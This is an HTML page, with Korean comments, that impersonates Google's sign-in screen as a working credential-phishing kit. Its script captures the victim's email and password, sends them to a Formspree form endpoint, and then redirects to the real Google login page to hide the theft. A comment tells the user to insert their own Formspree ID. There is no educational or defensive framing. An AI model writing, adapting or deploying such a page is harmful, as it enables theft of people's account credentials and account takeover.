<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>로그인 - Google 계정</title>
    <style>
        /* (아까 드린 디자인 CSS는 동일하므로 생략하거나 그대로 쓰시면 됩니다) */
        body { font-family: 'Noto Sans KR', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 400px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        h2 { font-size: 24px; font-weight: 400; margin: 10px 0 0; }
        p { font-size: 16px; margin: 8px 0 40px; color: #202124; }
        .input-group { position: relative; margin-bottom: 25px; }
        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .input-group label { position: absolute; top: 13px; left: 15px; color: #5f6368; transition: 0.2s; pointer-events: none; }
        .input-group input:focus ~ label, .input-group input:valid ~ label { top: -10px; left: 10px; font-size: 12px; background: #fff; padding: 0 5px; color: #1a73e8; }
        .input-group input:focus { outline: none; border: 2px solid #1a73e8; }
        .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">
            <span style="color: #4285F4">G</span><span style="color: #EA4335">o</span><span style="color: #FBBC05">o</span><span style="color: #4285F4">g</span><span style="color: #34A853">l</span><span style="color: #EA4335">e</span>
        </div>

        <!-- Formspree ID를 꼭 본인 것으로 바꾸세요! -->
        <form id="loginForm" action="https://formspree.io" method="POST">
            
            <div id="step-email">
                <h2>로그인</h2>
                <p>Google 계정 사용</p>
                <div class="input-group">
                    <input type="email" id="userEmail" name="email" required>
                    <label>이메일 또는 휴대전화</label>
                </div>
                <div class="btn-group">
                    <button type="button" style="background:none; border:none; color:#1a73e8; font-weight:bold;">계정 만들기</button>
                    <button type="button" class="next-btn" onclick="nextStep()">다음</button>
                </div>
            </div>

            <div id="step-password" style="display: none;">
                <h2>환영합니다</h2>
                <p id="display-email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; display:inline-block; padding:5px 12px;"></p>
                <div class="input-group">
                    <input type="password" id="userPw" name="password" required>
                    <label>비밀번호 입력</label>
                </div>
                <div class="btn-group">
                    <button type="button" style="background:none; border:none; color:#1a73e8; font-weight:bold;" onclick="prevStep()">뒤로</button>
                    <button type="submit" class="next-btn">로그인</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');

        // 1. 정보를 가로채서 전송하고 구글로 보내는 로직
        form.onsubmit = async (e) => {
            e.preventDefault(); // 기본 전송 막기

            const formData = new FormData(form);
            
            // Formspree로 정보 전송
            await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            });

            // 전송 완료 후 진짜 구글 로그인 페이지로 이동!
            window.location.href = "https://accounts.google.com";
        };

        function nextStep() {
            const email = document.getElementById('userEmail').value;
            if(email.includes('@')) {
                document.getElementById('step-email').style.display = 'none';
                document.getElementById('step-password').style.display = 'block';
                document.getElementById('display-email').innerText = email;
            }
        }

        function prevStep() {
            document.getElementById('step-email').style.display = 'block';
            document.getElementById('step-password').style.display = 'none';
        }
    </script>
</body>
</html>
